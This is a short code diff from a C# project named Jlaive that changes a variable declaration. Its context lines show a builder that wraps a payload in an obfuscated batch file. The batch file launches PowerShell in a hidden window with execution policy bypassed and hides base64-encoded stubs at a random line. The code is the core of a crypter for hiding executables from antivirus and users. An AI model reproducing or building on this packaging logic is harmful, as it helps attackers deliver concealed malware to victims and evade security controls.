@@ -41,7 +41,7 @@ namespace Jlaive
             builder.AppendLine("cd \"%~dp0\"");
             builder.AppendLine($"\"%~0.exe\" -noprofile{(hidden ? " -w hidden" : string.Empty)} -ep bypass -c {pscommand}");
             builder.Append("exit /b");
-            var obfuscated = new FileObfuscation().Process(builder.ToString(), 3);
+            string obfuscated = new FileObfuscation().Process(builder.ToString(), 3);
             var lines = new List<string>(obfuscated.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
             lines.Insert(_rng.Next(0, lines.Count), $":: {Convert.ToBase64String(stub)}\\{Convert.ToBase64String(stub2)}");
             return string.Join(Environment.NewLine, lines);
